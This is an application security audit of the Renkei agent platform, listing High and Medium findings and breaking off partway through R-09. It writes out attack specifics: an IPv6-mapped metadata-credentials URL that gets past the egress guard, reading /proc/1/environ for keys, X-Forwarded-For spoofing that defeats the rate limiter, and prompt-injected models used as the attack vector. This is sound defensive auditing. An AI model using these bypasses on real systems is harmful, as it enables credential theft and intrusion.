# Renkei — Application Security Audit Report

| | |
| --- | --- |
| Audit date | 2026-10-31 |
| Code under review | `campfhir/renkei` at commit `94fb37b` (2026-10-30), application version 0.1.0 |
| Method | Source-code review, read-only. No code was changed by the audit. No prior audit material was used; any earlier security report in the repository is superseded by this one. |
| Evidence standard | Every finding cites file and line numbers in this commit. Documentation (README.md, DEPLOYMENT.md, RENKEI.md, `docs/*.md`, `.env.example`, compose and Dockerfile comments, code comments) was treated as a set of claims and checked against the code; discrepancies are called out in each finding and collected in section 6. |

## 1. Executive summary

Renkei is a well-defended codebase by the standards of its category. Authentication, the OAuth 2.1 authorisation server, object-level authorisation in the chat, webhook verification, the knowledge access gate, the cryptographic primitives, the sandbox's uid isolation and the container hardening were all traced to code and found to work as described (section 7). Most of the serious problems found are not in the application logic itself. They are in the seams: a compose file that undoes the key separation the code was built for, an egress guard that misses a spelling the URL parser produces, an ownership check that exists in one code path but not the other, and dependencies that moved after the images were pinned.

Findings by severity (103 in total):

| Severity | Count | Identifiers |
| --- | --- | --- |
| High | 5 | R-01, R-02, R-03, D-01, D-02 |
| Medium | 22 | R-04 to R-23, D-03, D-04 |
| Low | 56 | R-24 to R-75, D-05 to D-08 |
| Informational | 20 | R-76 to R-94, D-09 |

The five High findings, in the order they should be fixed:

1. **Every container receives the whole `.env` (R-03).** The production compose file gives each of the twelve services `env_file: .env`, so the root-running sandbox container, every connector worker and the migrate job hold the database password, every encryption key, the setup secret and all four delegate caller keys, including the `web` key the delegate treats as "everything". The per-caller allow-list and the "a leak names which container" rotation story do not hold at the container boundary. A compose-only change fixes it.
2. **The sandbox egress guard passes IPv4-mapped IPv6 literals (R-02).** The private-address check recognises only the dotted spelling of a mapped address, and the WHATWG URL parser rewrites even that spelling into hex. `https://[::ffff:a9fe:a9fe]/` reaches the cloud metadata service from the headless browser and the fetch tools; any member or prompt-injected model can trigger it.
3. **Any member can chain onto another member's agent (R-01).** An `agent`-kind trigger is validated only for UUID shape; the worker then hands the finished run's summary and result to every trigger naming that id, whoever owns it. The drafting pipeline guards against exactly this; the save API does not.
4. **Every image runs Node 24.21.0 (D-01).** The pinned base digests predate the 2026-10-21 Node security release, which includes a Brotli decoder write reachable through `fetch` from any connected MCP server or LLM endpoint and two TLS hostname-verification bypasses. The build-time distribution upgrade cannot move Node and the image scanner cannot see it.
5. **The sandbox browser runs as root with Chromium's own sandbox off (D-02).** Playwright adds `--no-sandbox` unless told otherwise, the worker never drops privileges for the browser, and the bundled Chromium is an early 156 build behind the current stable's 52 security fixes. A renderer exploit on a visited page is root in the container that, per R-03, holds every secret.

Themes that run through the Medium findings:

- **Separation that is documented but not enforced.** Key separation (R-03), network segmentation (R-06), database privilege (R-13), the trusted-proxy allow-list (R-07) and the "disclosure gate" (R-23) are all described as controls and are either absent or weaker than described. Operators reading the documents will scope incidents and compliance claims incorrectly.
- **Controls that stop at the wrong layer.** Redaction skips `structuredContent` (R-10); the rate limiter's global ceiling is evictable (R-08); the knowledge gate withholds content but discloses counts (R-09); a remote MCP server classifies its own tools as read-only (R-12); agent access grants are full delegation with a key that outlives revocation (R-05).
- **Defaults that invite a worse configuration.** Plain HTTP on port 80 cannot complete a sign-in, so operators will work around it (R-07); the sandbox cannot reach its database as composed, so operators will flatten the network (R-06); `:latest` tags from a personal registry with no verification (R-19).
- **Cryptographic envelopes without context.** One key, no associated data, so a database writer can move a connector secret into a knowledge chunk and have the application decrypt it (R-04).

What was found sound deserves equal weight: no SQL injection, no script-injection sink on the application origin, no missing authentication on any of the 313 routes, no forged webhook that reaches the queue, no cross-user object access in the chat, and a sandbox whose spawned commands inherit nothing from the worker's environment. The report's recommendations are therefore mostly narrow: configuration, a few predicates, a canonicalisation step, and dependency hygiene with a schedule behind it. Section 8 gives the order.

## 2. Scope and approach

### 2.1 What was reviewed

| Area | Material |
| --- | --- |
| Web application | `apps/web`: Next.js 16 App Router, 313 route handlers under `app/api`, server components, client components, `proxy.ts`, `instrumentation.ts`, `next.config.ts`, `lib/**` |
| Workers | `apps/worker` (events and embeddings), `apps/worker-agents`, `apps/worker-delegate`, `apps/worker-sandbox`, `apps/worker-fileshares`, `apps/worker-onbase`, `apps/worker-mirth`, `apps/worker-admanager` |
| Shared packages | the 43 `packages/*` (crypto, user-keys, provider-grants, connector-config, db, queue, knowledge, gates, redaction, settings, connector-*, mcp-client, sandbox-client, delegate-client, email-sanitizer, document-text, document-render, notifications, voice, and the rest) |
| Deployment | `docker/Dockerfile` (all stages), `docker/sandbox-entrypoint.sh`, `docker-compose.yaml` (production), `docker-compose.yml` (development, for leakage only), `.github/workflows/ci.yml`, `pnpm-workspace.yaml`, `patches/`, `.trivyignore`, `scripts/*.sh` |
| Dependencies | `pnpm-lock.yaml` resolved versions, the image configurations behind the pinned digests, the toolchains baked into the sandbox image, public advisory databases |
| Documentation | README.md, DEPLOYMENT.md, RENKEI.md, NGROK_SETUP.md, AGENTS.md, `docs/*.md`, `apps/web/.env.example` |

### 2.2 How the review was organised

Twelve parallel review tracks, each with an explicit question list and the same evidence rules (cite file and line; treat comments and docs as claims; mark anything not confirmed as unverified), followed by a second pass by the lead reviewer over the code cited by every High finding and by the cross-cutting Medium findings. Where two tracks disagreed (the Chromium sandbox flag), the code and the library source were re-read and the disagreement is recorded in the finding.

1. Authentication, sessions, OIDC sign-in, first-run setup, roles and route authorisation coverage
2. MCP gateway, OAuth 2.1 authorisation server, bearer tokens, tool gating, external MCP servers
3. Chat, projects, artifacts, attachments, sharing grants (object-level authorisation)
4. Agents, action batches and approvals, batch jobs, notifications, audit and application logs
5. Sandbox worker: code workspaces, scripts, headless browser, services, git proxy
6. Cryptography, key management, the delegate, per-user keys, provider grants
7. Connectors, outbound egress and SSRF, provider OAuth connect flows, connector workers
8. Unauthenticated surface: webhooks, health and discovery, rate limiting, resource exhaustion
9. Deployment, container images, CI/CD, supply chain, configuration and operations
10. Data layer: SQL safety, tenant scoping, queue, knowledge ACL gate, disclosure and redaction gates, untrusted-file parsers, the QuickJS cleaner-script runtime
11. Browser-side: XSS and content rendering, iframes, postMessage, service worker, CSP
12. Known vulnerabilities in dependencies and base images, and their reachability

Where it was possible without touching the repository, reviewers executed the code under review: the return-path check (R-17), the rate limiter (R-08), the egress guard against alternate address spellings (R-02), the redirect-URI validator, and `pnpm audit` against the lockfile.

### 2.3 What was not done

- No dynamic testing against a running deployment, no network scanning, no exploitation. Where a finding depends on runtime or kernel behaviour the report says what would confirm it.
- The vendor APIs behind connectors (Atlassian, Microsoft Graph, WebEx, Zoom, Salesforce, OnBase, Mirth, ADManager Plus) were not assessed; only Renkei's use of them.
- Dependencies were checked against public advisories and, for a few, read from their tarballs; they were not audited line by line.

## 3. The system as deployed

### 3.1 Deployment model assumed

The production artefact is `docker-compose.yaml` plus a `.env` file, running pre-built images from Docker Hub (`scotteremiaroden/renkei-*:latest`) on one host. One organisation per deployment: the schema dropped its `tenant_id` columns in migration 153, and operator, settings and connector configuration are organisation-wide. The web app is published on host port 80 (plain HTTP) by default; the compose file's own comments say a TLS-terminating reverse proxy is expected for anything beyond a private network. The development database and its defaults were not considered a production concern except where a development value can leak into production (section 5 notes the two places it can).

Processes and trust boundaries, from `docker-compose.yaml` and `docs/architecture.md`, verified against the Dockerfile stages:

| Container | Runs as | Networks | Holds |
| --- | --- | --- | --- |
| `renkei` (web) | `nextjs`, read-only rootfs, no capabilities | `renkei-internal`, `renkei-sandbox`, host port 80 | session cookies, the MCP OAuth server, every API route, chat turn execution, webhook receipt |
| `worker`, `embeddings-worker`, `worker-agents`, `worker-batch-jobs` | `worker`, read-only, no capabilities | `renkei-internal` (batch-jobs also `renkei-sandbox`) | queue consumers; the agents worker runs autonomous agent conversations and executes approved action batches |
| `worker-delegate` | `worker`, read-only, no capabilities | `renkei-internal`, `renkei-sandbox` | the key service: opens chat data keys, provider grants and connector credentials for named callers; hosts the `/git/<ticket>` proxy |
| `worker-fileshares`, `worker-onbase`, `worker-mirth`, `worker-admanager` | `worker`, read-only, no capabilities | `renkei-internal` | protocol clients to on-premise systems in private address space |
| `worker-sandbox` | root (CHOWN, DAC_OVERRIDE, FOWNER, KILL, SETGID, SETUID, SETPCAP; no-new-privileges; default seccomp) | `renkei-sandbox` only | per-caller uids running LLM-written commands and scripts, a headless Chromium, an optional Docker socket for project services |
| `postgres` | image default | `renkei-internal` | everything: sessions, grants (sealed), chats (sealed), knowledge chunks (sealed content, plaintext lexemes and keywords), queue, logs, audit |

Identity: people sign in through the organisation's OIDC provider; roles (`renkei-user`, `renkei-operator`, `renkei-preview`, `renkei-chat`, `renkei-email`, `renkei-agent`, `renkei-verify`) are derived from IdP claims. The first identity provider is saved under a `SETUP_SECRET` from the environment. Tool calls from the chat, from MCP clients and from agent runs all pass through one gateway at `/api/mcp/[transport]`, where per-user, per-organisation projection, read-only mode, usage tracking and redaction apply.

### 3.2 Actors in the threat model

Outside-in:

- O1. An anonymous Internet client reaching port 80 or 443, or any client on whatever network the operator exposes the app to.
- O2. A registered MCP client (dynamic client registration can be switched on) and the model behind it.
- O3. A party sending HTTP to the webhook routes claiming to be GitHub, Bitbucket, Microsoft Graph, WebEx or Zoom.
- O4. A third party the organisation connected: an external MCP server, an LLM or embeddings endpoint, an OAuth provider, a Git host.
- O5. A web site visited by the sandbox's headless browser, or a package fetched by a workspace command.

Inside-out:

- I1. An authenticated ordinary member (`renkei-user`), including a collaborator on a shared chat, project or agent.
- I2. A model under prompt injection acting through tools, in chat or in an autonomous agent run.
- I3. Code executing inside a sandbox workspace or script, LLM-written or committed to a cloned repository.
- I4. A compromised worker container holding its bearer keys and environment.
- I5. An operator (`renkei-operator`) acting carelessly or maliciously toward other members' data.
- I6. Someone holding a database dump or backup, with or without the environment keys, or holding a database write primitive.

## 4. Reading the findings

Section 5 lists findings by severity: High (5.1), Medium (5.2), Low (5.3), Informational (5.4), then dependency and base-image findings (5.5). Each High and Medium finding gives the component, the decisive evidence with a short code quotation, what is wrong, who can exploit it from where, the impact, the documentation claim it contradicts, a recommendation with its rationale, and how confident the reviewers are. Low and Informational findings are tabulated with the same elements in compressed form. Section 6 consolidates documentation discrepancies, section 7 records controls verified as working, section 8 orders the remediation, and section 9 states the review's limits.

## 5. Findings

Finding identifiers are `R-nn`. The tag in brackets names the review track that produced the finding, so the per-track working notes can be consulted. Every line reference is to commit `94fb37b`.

Severity is assigned for this deployment model, not from a generic CVSS score:

| Severity | Meaning here |
| --- | --- |
| High | Reachable by an ordinary authenticated member, by a prompt-injected model, or by one container compromise, with cross-user data exposure, credential exposure, or SSRF into infrastructure as the result. |
| Medium | Needs an elevated position (operator, collaborator, database writer, connected third party) or a chain, or is a defence-in-depth control that is documented as present but does not hold. |
| Low | Limited impact or hard preconditions; hardening. |
| Info | Observations and documentation discrepancies with no direct security impact. |

### 5.1 High

#### R-01 Any member can chain a trigger onto another member's agent and receive that agent's run output [AGENT-1]

- Severity: High
- Component: `packages/agents/src/triggers.ts`, `apps/web/lib/agents/store.ts`, `packages/db/src/store/domains/agents/postgres.ts`, `apps/worker-agents/src/finalize.ts`
- Evidence: the only validation of an `agent`-kind trigger is that the caller id is UUID-shaped (`packages/agents/src/triggers.ts:142-147`):

  ```ts
  case 'agent': {
    if (!UUID_PATTERN.test(draft.callerAgentId)) {
      issues.push({ index, message: 'Choose which agent should trigger this one.' });
    }
  ```

  The save path stores it verbatim (`apps/web/lib/agents/store.ts:297-304`) and `saveAgent` (`apps/web/lib/agents/save.ts:70-74`) runs `validateAgentDraft`, which performs no ownership lookup. The worker's fan-out query joins triggers to agents on `config->>'callerAgentId'` with no owner predicate (`packages/db/src/store/domains/agents/postgres.ts:556-583`), and `finalize.ts:76-95` starts a run of every target with the finished run's `summary` and `result` in `initialState.parentSummary`.
- Description: chaining is "authorised on the target" only. The owner of the source agent never consents and is never told. The drafting pipeline recognises the hazard and restricts the LLM-drafted mapping to agents the drafter owns (`apps/web/app/api/agents/draft/[draftId]/run/route.ts:87-91`), but the API that saves an agent does not enforce the same rule.
- Attack path (inside-out, I1): a member learns a victim's agent id (every grantee, current or former, has it; it appears in run links in approval notes and notifications). They create an enabled agent whose only trigger is `{kind:'agent', callerAgentId:'<victim id>'}` and whose instructions forward `trigger.parentSummary`. Every successful run of the victim's agent now starts the attacker's run with the victim's agent output, compiled from the victim's mail, tickets and documents. The victim's run shows `done` and nothing else.
- Impact: silent, repeatable cross-user disclosure of agent output; also an amplification channel against the organisation-wide daily run cap (R-20).
- Documentation: `docs/agents.md:76` and `apps/worker-agents/src/finalize.ts:5-7` describe target-side authorisation as the design; neither mentions that the source owner is not consulted.
- Recommendation: reject a `callerAgentId` the saving owner does not own in `validateAgentDraft` or `saveAgent` (the draft route already computes `listAgentNames(subject)`), and add `caller.owner_subject = target.owner_subject` to `listChainTargets` so existing rows stop firing. Rationale: the builder only ever offers the owner's own agents, so this restores the intended behaviour with no UX loss. If cross-owner chaining is wanted later, model it as an access grant on the source agent, which is the consent object that already exists.
- Confidence: confirmed by reading the full path (validation, save, store query, fan-out). Independently re-verified by the lead reviewer.

#### R-02 The sandbox egress guard passes IPv4-mapped IPv6 literals, including the cloud metadata address [SBX-1]

- Severity: High
- Component: `packages/connector-sandbox/src/egress-guard.ts` (`isBlockedIPv6`), used by `apps/worker-sandbox/src/browser-proxy.ts`, `guarded-fetch.ts`, the `sandbox_download_url`, `sandbox_fetch_page` and crawl paths, and `apps/web/lib/safe-fetch.ts`.
- Evidence (`egress-guard.ts:56-64`):

  ```ts
  const mapped = lower.match(/^::ffff:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/); // IPv4-mapped
  if (mapped) return isBlockedIPv4(mapped[1]);
  return false;
  ```

  Only the dotted spelling is recognised. `resolvePublicAddress` returns an IP literal without a DNS step (`egress-guard.ts:128-131`), so the literal is dialled as given. The lead reviewer confirmed with Node 24 that the WHATWG URL parser normalises even the dotted form: `new URL('https://[::ffff:169.254.169.254]/').hostname` is `[::ffff:a9fe:a9fe]`, which the regex never matches. For any URL-sourced host the mapped-address check is therefore dead code, and `::ffff:a9fe:a9fe` (169.254.169.254), `::ffff:7f00:1` (loopback), `::ffff:0a00:1` (10.0.0.1), NAT64 `64:ff9b::/96`, 6to4 `2002::/16` and site-local `fec0::/10` all pass.
- Description: this guard is the only SSRF boundary for the headless browser (every Chromium connection is pinned through `browser-proxy.ts:84-115`) and for the fetch and crawl tools. On a Linux host with an IPv6-capable socket layer, a connect to an IPv4-mapped IPv6 address reaches the embedded IPv4 destination.
- Attack path (inside-out, I2): a prompt-injected model, or any member with the `sandbox_browser_*` or `sandbox_download_url` tools, opens `https://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/` (or the equivalent on Azure or GCP). The page body is returned to the model as a snapshot or staged as a file. The same literal form reaches internal IPv4 services on the sandbox's networks.
- Impact: theft of cloud instance credentials and reads of internal services from the one container that runs untrusted code. The `renkei-sandbox` network has a route out by design.
- Documentation: `egress-guard.ts:38` ("link-local (incl. the cloud metadata IP)") and `docs/sandbox-connector-design.md` claim private and metadata addresses are refused.
- Recommendation: canonicalise before classifying. Parse every IPv6 literal, extract the embedded IPv4 for the mapped, compatible, NAT64 and 6to4 forms and run `isBlockedIPv4` on it; then allow only global-unicast IPv6 (`2000::/3`) that is not one of those transitional forms. Prefer an allow-list of global scope over the current prefix deny-list, because the deny-list will keep missing spellings. Rationale: this closes the class, not the one literal, and costs a few lines.
- Confidence: the filter bypass is confirmed by reading and by running the URL normalisation check. Whether the dial completes depends on the IPv6 socket support inside the container, which Docker leaves available by default; this was not exercised on a live host.

#### R-03 Every container receives the whole `.env`, so the per-caller key separation is void and the root sandbox container holds every secret [DEPLOY-1, CRYPTO-1]

- Severity: High
- Component: `docker-compose.yaml`, `apps/worker-delegate/src/callers.ts`
- Evidence: every service carries `env_file: - .env` (`docker-compose.yaml:118-119, 137-138, 179-180, 202-203, 234-235, 264-265, 287-288, 311-312, 335-336, 367-368, 493-494, 573-574`). The documented `.env` holds `POSTGRES_PASSWORD`, `TOKEN_ENCRYPTION_KEY`, `LOG_ENCRYPTION_KEY`, `CONTENT_ENCRYPTION_KEY`, `SETUP_SECRET`, `USER_KEY_ENCRYPTION_KEY`, all four `DELEGATE_KEY_*`, `SANDBOX_WORKER_API_KEY`, `SANDBOX_ENV_SECRETS_KEY`, the four connector-worker keys, the log-shipping keys and `AZURE_BLOB_KEY` (DEPLOYMENT.md:17-89). The delegate's allow-list gives `web: 'all'` and `sandbox: []` (`callers.ts:32-36`), and `web` may open any subject's sealed values and data keys (`apps/worker-delegate/src/server.ts:338-342, 368-375, 462-480`).
- Description: the design pays for per-caller delegate keys so that "a key that leaks from one container names which one, and it is rotated alone" (`docker-compose.yaml:41-51`), and for a legacy user-key master that is "set on the DELEGATE service only" (DEPLOYMENT.md:36-41). The `env_file` directive re-adds everything to every container, including the sandbox worker, which runs as root and executes LLM-written commands. The sandbox worker does build a fresh environment for the commands it spawns (`apps/worker-sandbox/src/workspaces.ts:371-406`), so a plain prompt injection does not read these values; the exposure is at the process and container level.
- Attack path (inside-out, I3 then I4): any compromise of the sandbox worker process (it drives Chromium, runs git, pip and npm for untrusted repositories, and parses model-controlled input) or of any other container reads `/proc/1/environ`, presents `DELEGATE_KEY_WEB` to the delegate on the shared network, and opens every active user's data keys, provider tokens and connector credentials. With `TOKEN_ENCRYPTION_KEY` and `POSTGRES_PASSWORD` it also decrypts every organisation-level secret once it has a route to Postgres (see R-06 for why operators are likely to add one).
- Impact: one container compromise equals every secret in the deployment; the delegate's allow-list and the key-rotation story do not hold at the container boundary.
- Documentation: DEPLOYMENT.md:36, 43-57, 309-311, 473-474 and `docker-compose.yaml:41-51` all state separations the compose file does not provide.
- Recommendation: remove `env_file: .env` from every application service and pass each service an explicit `environment:` list interpolated from `.env` (the file already does this for `DELEGATE_WORKER_API_KEY` through the `x-delegate-*` anchors at lines 73-84). The delegate alone gets `USER_KEY_ENCRYPTION_KEY` and the connector-worker keys; the sandbox gets `DATABASE_URL`, its own delegate key, `SANDBOX_WORKER_API_KEY`, `SANDBOX_ENV_SECRETS_KEY` and `LOG_ENCRYPTION_KEY`; the web app gets `SETUP_SECRET` and `TOKEN_ENCRYPTION_KEY`. Add a CI check over `docker compose config` that fails if `DELEGATE_KEY_WEB` or `USER_KEY_ENCRYPTION_KEY` appears in any other service. Rationale: a compose-only change, no code impact, and it is the cheapest way to make the existing allow-list mean something. Docker secrets with `_FILE` loaders are the next step.
- Confidence: confirmed by reading the compose file and the allow-list; compose `env_file` semantics are standard. Independently re-verified by the lead reviewer.

### 5.2 Medium

#### R-04 Secretbox envelopes carry no associated data and share one key across purposes, so a database writer can relocate any organisation-level secret into a row the application will decrypt and display [CRYPTO-2]

- Severity: Medium
- Component: `packages/crypto/src/secretbox.ts`, `content.ts`; `packages/connector-config/src/index.ts`; `packages/knowledge/src/index.ts`
- Evidence: the AEAD call binds key, IV and plaintext only (`secretbox.ts:158-170`, no `setAAD`); the content envelope is the same secretbox with a `renc1:` prefix (`content.ts:55-56, 64-71`) and falls back to `TOKEN_ENCRYPTION_KEY` when `CONTENT_ENCRYPTION_KEY` is unset (`content.ts:39-44`, re-read by the lead reviewer); connector secrets, model API keys and the OIDC client secret are sealed under the same key (`connector-config/src/index.ts:389, 416`; `apps/web/app/api/admin/llm-models/route.ts:67-68`; `packages/user-keys/src/rewrap.ts:83-84`); the knowledge reader renders `revealContent(row.content, contentKey)` (`packages/knowledge/src/index.ts:289`).
- Description: nothing binds a ciphertext to its table, column, row or purpose. The `v2.<kid>` prefix identifies the key, not the use. A ciphertext copied from `connector_configs.encrypted_secrets` into `knowledge_chunks.content` with `renc1:` prepended is a valid content envelope, and the knowledge search decrypts and returns it. Per-person and per-chat keys are not relocatable across subjects or resources because the wrapping keys differ, so that half of the design holds.
- Attack path (I6 with write access, or a future SQL injection): copy the GitHub connector's sealed secrets into a chunk the attacker can read, run `search_knowledge` as an ordinary user, read `{"clientSecret":…,"webhookSecret":…}`. The OIDC client secret and every model API key are reachable the same way.
- Impact: a database-write primitive becomes disclosure of every organisation-level secret without any key material; the application is the decryption oracle. Rated Medium because write access is the precondition.
- Documentation: `content.ts:14-18` and DEPLOYMENT.md:1271-1273 present `CONTENT_ENCRYPTION_KEY` as a rotation convenience; nothing says that leaving it unset removes domain separation between content and credentials.
- Recommendation: bind purpose and location as associated data (`cipher.setAAD(`${purpose}\0${rowId}`)`) through an optional `aad` argument on `encrypt`/`decrypt`, with per-call-site constants, using the existing `renc2b` bytes envelope (which already binds the key id, `keys.ts:266-283`) as the model; where a row id is unknown at seal time, derive per-purpose subkeys with HKDF. Rationale: a few lines in `secretbox.ts` plus one `rewrap` pass; AAD is the standard answer to ciphertext relocation and costs nothing at runtime.
- Confidence: confirmed by reading the encrypt, decrypt and knowledge read paths; not executed.

#### R-05 An agent access grant is full delegation of the owner's connected accounts, including a bearer key that survives revocation of the grant [AGENT-2]

- Severity: Medium
- Component: `apps/web/lib/agents/access-grants.ts`, `apps/web/app/api/agents/[agentId]/route.ts`, `apps/web/app/api/agents/[agentId]/invoke/route.ts`, `apps/web/lib/agents/save.ts`, `apps/worker-agents/src/engine.ts`
- Evidence: a grantee's PUT saves under the owner and validates tools against the owner's projection (`[agentId]/route.ts:47-58`, `save.ts:73`); a new `api` trigger mints a key that is returned to whoever saved (`store.ts:305-315`, `save.ts:220-226`); the bearer invoke path checks only that the key matches a trigger on the agent and that the agent is enabled, never the grant (`invoke/route.ts:98-115`); a grantee-started run is `triggerKind:'manual'` on the owner's grants (`invoke/route.ts:160-168`, `engine.ts:745-778`), which the default approval policy treats as not externally triggered (`packages/agents/src/act-approval.ts:114-116`), so `autoAcceptActions` applies.
- Description: a grant intended as a troubleshooting share lets the grantee rewrite instructions, pick any of the owner's connected tools, switch on auto-accept, run immediately with the owner's credentials, read memory and knowledge notes, and mint an API key that keeps working after the grant expires or is revoked. The owner receives an in-app notice by default.
- Impact: confused-deputy escalation from grantee to owner's connected accounts, and a revocation that does not revoke.
- Documentation: `docs/agents.md:95` says run content is visible to the owner, and to an administrator only on a failed run; grantees are not mentioned. `docs/agents.md:69` calls knowledge notes owner-curated; `knowledge/route.ts:104-147` lets a grantee create and purge them.
- Recommendation: (1) on the bearer path, refuse a key whose creator is neither the owner nor a current grantee (store `createdBySubject` on api triggers), or rotate grantee-minted keys when their grant ends; (2) treat a run started by a non-owner as externally triggered for the approval policy; (3) state in the sharing dialog that the grantee can edit and run on the owner's credentials, or split the grant into view and edit levels. Rationale: (1) and (2) are a few lines each and restore the two controls the owner already has, revocation and approval.
- Confidence: confirmed by reading the full path; not executed.

#### R-06 The sandbox worker is a Postgres client but the production compose gives it no route to Postgres; the shipped segmentation is either non-functional or will be flattened by the operator [DEPLOY-2]

- Severity: Medium
- Component: `docker-compose.yaml`, `apps/worker-sandbox/src/*`
- Evidence: `postgres` joins `renkei-internal` only (`docker-compose.yaml:111-112`); `worker-sandbox` joins `renkei-sandbox` only (`:558-559`) yet receives `DATABASE_URL` (`:496`). The worker calls `getDataStore()` from `store.ts`, `secrets-store.ts`, `service-store.ts`, `crawl-store.ts`, `image-rules-store.ts`, `workspace-store.ts` and `env-secrets-store.ts`, polls `getOrgSettings()` (`index.ts:159-161`) and writes its log table. Its boot check only constructs the pool and does not connect (`packages/db/src/platform.ts:43-47`, re-read by the lead reviewer), so it starts cleanly and fails on first query.
- Description: Docker's embedded DNS resolves a service name only across a shared network. As shipped, every staged-file insert, settings read and crawl fails. The compose comments (`:441-445, 628-635`) and DEPLOYMENT.md:459-464 present the two-network layout as a working security property. The obvious operator fix, joining Postgres or the sandbox to the other network, gives every LLM-run workspace command (which has the container's network by design) a route to the database and to every egress worker.
- Impact: the segmentation claim cannot be true as written; the realistic end state is a flat network around the untrusted-code container. Combined with R-03, that container already holds the database password.
- Recommendation: either make the sandbox worker database-free (its rows served over HTTP by the delegate, which is already on `renkei-sandbox`), or add a third network joining only `postgres` and `worker-sandbox` with a dedicated low-privilege database role (see R-13), and document that the sandbox container has a database route. Add a compose-level smoke test to CI that stages one sandbox file; `scripts/smoke-image.sh` runs images on `--network host` and never exercises the compose topology.
- Confidence: confirmed by reading compose networks and the worker's store imports; not executed.

#### R-07 Forwarded headers are trusted unconditionally, the documented `TRUSTED_PROXY_IPS` control does not exist, `PUBLIC_BASE_URL` is optional, and the production compose publishes plain HTTP on port 80 to all interfaces [AUTH-5, DEPLOY-4, WEB-2, CONN-13, AUTH-6, DEPLOY-15]

- Severity: Medium
- Component: `apps/web/lib/get-origin.ts`, `apps/web/lib/public-origin.ts`, `apps/web/.env.example`, `docker-compose.yaml`, `apps/web/lib/session.ts`, `apps/web/lib/security-headers.ts`
- Evidence: with `PUBLIC_BASE_URL` unset the origin is `X-Forwarded-Proto://X-Forwarded-Host`, else the request's own `Host` (`get-origin.ts:37-64`). `.env.example:44-47` documents `TRUSTED_PROXY_IPS` ("Default: localhost only"); a repository-wide search finds no reader. `docker-compose.yaml:597-602` says the port "must never be reachable by untrusted clients directly: keep it published on 127.0.0.1", and the next lines publish `'80:3000'` (`:603-604`). `packages/settings/src/index.ts:762-765` makes `PUBLIC_BASE_URL` optional and no boot check requires it. The derived origin feeds the OIDC `redirect_uri` (`login/route.ts:122`, `callback/route.ts:361`), 15 connector authorize routes, the MCP consent origin and issuer (`oauth-authorization-server/route.ts:16-24`), WebEx webhook targets (`webex/all-spaces/route.ts:54`) and the admin copy-paste URLs.
- Description: three facts compound. The control operators are told about does not exist. Nothing refuses a production boot without a declared origin. The default artefact serves cleartext on the public interface. Because `NODE_ENV=production` is baked into every image (`docker/Dockerfile:181, 247, 294, 342, 391, 437, 484, 800`) the session and OIDC state cookies are `Secure`, so browser sign-in over `http://host:80` from any machine but localhost cannot complete (`session.ts:61-69`, `login/route.ts:141, 153`). The failure mode is a "login loop", which invites ad hoc workarounds. Non-cookie credentials (MCP bearer tokens, webhook secrets, upload-slot tokens) still travel in the clear on that port.
- Attack path (outside-in, O1): with the default compose and no `PUBLIC_BASE_URL`, a client sets `X-Forwarded-Host` on requests to the discovery document or sign-in start and receives issuer and redirect values naming its own host. The reviewers traced the consequences: they are self-affecting (a registered IdP rejects the redirect URI) and no stored or shared use of a request-derived origin was found. A passive network attacker on the cleartext port reads bearer tokens.
- Impact: cleartext credential exposure under the shipped default, host-header poisoning of security-relevant URLs under an easy misconfiguration, and operator confusion created by documentation.
- Documentation: `.env.example:44-47` (non-existent control); `docker-compose.yaml:18-22` ("fine on a private/internal network", which cannot sign in); DEPLOYMENT.md:1080-1081 checklist pre-ticked "HTTPS enabled"; RENKEI.md Decision 19 lists "trusted proxy IPs".
- Recommendation: make `PUBLIC_BASE_URL` mandatory under `NODE_ENV=production` (one line beside the delegate-key refusal in `instrumentation.ts:33-37`) and drop the forwarded-header fallback in production; publish `127.0.0.1:3000:3000` in the compose file and make the TLS proxy the documented path; delete or implement `TRUSTED_PROXY_IPS`; add `PUBLIC_BASE_URL=` to `.env.example`. Rationale: a mandatory declared origin makes the whole class moot at zero runtime cost, and the cookie policy already makes the plaintext mode non-functional.
- Confidence: confirmed by reading and by repository-wide search. Independently re-verified by the lead reviewer.

#### R-08 The inbound rate limiter's global ceiling is cleared by a flood of unique spoofed client addresses [WEB-1]

- Severity: Medium
- Component: `apps/web/lib/inbound-rate-limit.ts`; all five webhook routes, OIDC login start, OAuth token, authorize and register.
- Evidence (`inbound-rate-limit.ts:168, 186-193, 209-217`):

  ```ts
  if (windows.size >= MAX_TRACKED_KEYS) windows.clear();   // also deletes `${endpoint}:global`
  ```

  `clientKey` takes the left-most `X-Forwarded-For` value verbatim (`:196-201`), and `hit()` is called on the client key even when the global verdict has already denied.
- Description: the file's contract (`:128-134`) is that the per-client limit is spoofable and the global limit is "the actual ceiling, which no amount of header spoofing can widen". The bounded-map protection clears the whole table, global windows included, once 10,000 live keys exist. The reviewer reproduced it with a verbatim JavaScript port: a 100,000-request flood with unique forwarded addresses over about 100 seconds was allowed 60,010 times against a documented ceiling of 6,000 per minute.
- Attack path (O1): vary `X-Forwarded-For` per request against `/api/webhooks/microsoft/<any>` (one database read per allowed request) or against the OIDC login start or OAuth token endpoint. Behind a proxy that appends to the header the left-most value is still client-chosen.
- Impact: the only unauthenticated-abuse control degrades to whatever the box can serve; OIDC-start and OAuth-token brute force run far above the documented rate.
- Documentation: DEPLOYMENT.md:1087 and `inbound-rate-limit.ts:128-134, 162-166`.
- Recommendation: keep global windows in a separate map that is never evicted, evict per-client keys oldest-first instead of clearing, and do not charge the client key when the global verdict already denied. Rationale: smallest change with the largest effect; a proxy-level `limit_req` remains the cross-replica answer.
- Confidence: confirmed by reading and by running the port.

#### R-09 Knowledge search reports counts of matching content the user may not read, an existence oracle over the whole index [DATA-1]

- Severity: Medium
- Component: `packages/knowledge/src/index.ts`, `packages/gates/src/acl.ts`, `apps/web/lib/mcp-tools/knowledge/index.ts`, `apps/web/app/(app)/knowledge/actions.ts`
- Evidence: `verifyCandidates` returns `{allowed, elided, unverified}` (`acl.ts:184-191`); `withheldNote` prints "N withheld: you do not have access at the source" (`acl.ts:213-215`, used at `mcp-tools/knowledge/index.ts:319-320`); the page returns `elided` and `weak` to the browser (`actions.ts:216-222`); `weak` is counted before the gate runs (`index.ts:472-500`). The lexical arm is an exact `websearch_to_tsquery` match and the page accepts `key:value` metadata filters (`actions.ts:108-113`). A verifier with no credential returns an empty allow set (`connector-atlassian/src/verifier.ts:92`), so a user with no Jira connection at all still receives the count. The pre-filter that keeps foreign rows out exists only for owner-scoped providers, with the stated rationale that "a withheld tally of a coworker's mailbox is itself a disclosure" (`index.ts:260-266`).
